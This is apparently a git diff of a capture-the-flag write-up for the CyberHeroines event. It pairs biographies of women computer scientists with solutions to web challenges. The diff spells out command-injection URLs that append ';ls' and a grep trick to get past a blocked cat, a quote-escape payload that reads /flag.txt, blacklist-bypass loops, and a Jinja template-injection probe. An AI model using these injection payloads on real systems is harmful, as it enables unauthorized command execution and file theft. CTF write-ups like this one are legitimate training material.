@@ -20,7 +20,7 @@ Grace Hopper, born in 1906, was a pioneering computer scientist and U.S. Navy Re
 
 ![First computer bug](ctf/cyberheroines/images/bug.jpg)
 
-In the CTF challenge, we can input commands into an input field and somehow have to retract the flag. But soon to be noticed, a lot of linux commands are blogged by the system, including **ls**, **cat**, **head** and many more. Still, this challenges showcases that it is relatively easy to circumvent blacklisting of "security critical"commands.
+In the CTF challenge, we can input commands into an input field and somehow have to retract the flag. But soon to be noticed, a lot of linux commands are blogged by the system, including ls, cat, head and many more. Still, this challenges showcases that it is relatively easy to circumvent blacklisting of "security critical"commands.
 A quick google search helped me to find that I can list the files and read them using
 
 ```bash
@@ -32,8 +32,6 @@ done <cyberheroines.sh
 ```
 
 This reveals the flag.
-
-![Listing the files](ctf/cyberheroines/images/grace-hopper.png)
 
 ## Susan Landau
 
@@ -51,22 +49,34 @@ After analyzing the whole application by looking at the source code and utilizin
 
 If we now go into Burp Repeater and make another request, but substituting that CSRF token with the hash of "cyberheroine", we obtain the flag as the response.
 
-![Sending the request to Burp Repeater](ctf/cyberheroines/images/landau-4.png)
-
 ## Radia Perlman
 
 ![Radia Perlman](ctf/cyberheroines/images/perlman-profile.jpg)
 
 Radia Perlman, or the "mother of the internet", is a renowned computer scientist celebrated for her groundbreaking work in the field of network protocols. Her most significant achievement is undoubtedly the creation of the Spanning Tree Protocol (STP), a fundamental protocol that ensures the stability and redundancy of computer networks.
 
-In this challenge, we get presented a webpage called "My DNS App" and we get told that we can query the DNS information of any domain via the dns query parameter like so: **/dns?ip=cyberheroines.ctfd.io**.
+In this challenge, we get presented a webpage called "My DNS App" and we get told that we can query the DNS information of any domain via the dns query parameter like so:
+
+```bash
+curl https://cyberheroines-web-srv3.chals.io/dns?ip=cyberheroines.ctfd.io
+```
 
 ![Radia Perlman](ctf/cyberheroines/images/perlman.png)
 
-The output looks a lot like it just runs an OS command in the background, so it is natural to try to inject additional OS commands to read out the flag, e.g. **/dns?ip=cyberheroines.ctfd.io;ls**. This shows us in the output that there is indeed a flag.txt.
+The output looks a lot like it just runs an OS command in the background, so it is natural to try to inject additional OS commands to read out the flag, e.g.
 
-The **cat** command is blocked. However we can circumvent it using the trick **grep "" flag.txt**.
-**dns?ip=cyberheroines.ctfd.io;grep%20%22%22%20flag.txt** gives us the flag.
+```bash
+curl https://cyberheroines-web-srv3.chals.io/dns?ip=cyberheroines.ctfd.io;ls
+```
+
+This shows us in the output that there is indeed a flag.txt.
+
+The cat command is blocked. However we can circumvent it using the following trick to get the flag:
+
+```bash
+# grep "" flag.txt
+curl https://cyberheroines-web-srv3.chals.io/dns?ip=cyberheroines.ctfd.io;grep%20%22%22%20flag.txt
+```
 
 ## Shafrira Goldwasser
 
@@ -84,11 +94,11 @@ For this challenge, we get a webpage where we can query biography's of a given l
 
 But in contrast to the previous challenge, we also get to see the source code.
 
-At first, it looks like a naive SQL injection, but actually it is another Command Injection, where we just have to escape the query string using **'" &&** and after that we can run arbitrary linux commands again.
+At first, it looks like a naive SQL injection, but actually it is another Command Injection, where we just have to escape the query string using _'" &&_ and after that we can run arbitrary linux commands again.
 
 ![In Burp](ctf/cyberheroines/images/goldwasser-3.png)
 
-Sending the request for the biography to Burp Repeater, we can substitute the **heroine_name** parameter with the following payload and get the flag:
+Sending the request for the biography to Burp Repeater, we can substitute the _heroine_name_ parameter with the following payload and get the flag:
 
 ```
 ada'" && cat /flag.txt #
@@ -104,7 +114,7 @@ Frances Allen was a trailblazing computer scientist known for her remarkable ach
 
 On the webpage of the challenge, we can make a post to nominate our personal cyber heroine.
 
-Trying to enter something like **{{2 + 2}}** and getting **4** back confirms that we have a template injection vulnerability here. Given that all the previous challenge was written in Python Flask, we can assume that it is probably the Jinja templating language that is used.
+Trying to enter something like _{{2 + 2}}_ and getting _4_ back confirms that we have a template injection vulnerability here. Given that all the previous challenge was written in Python Flask, we can assume that it is probably the Jinja templating language that is used.
 
 We can find a suitable payload to read out the flag from [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2---basic-injection):
 
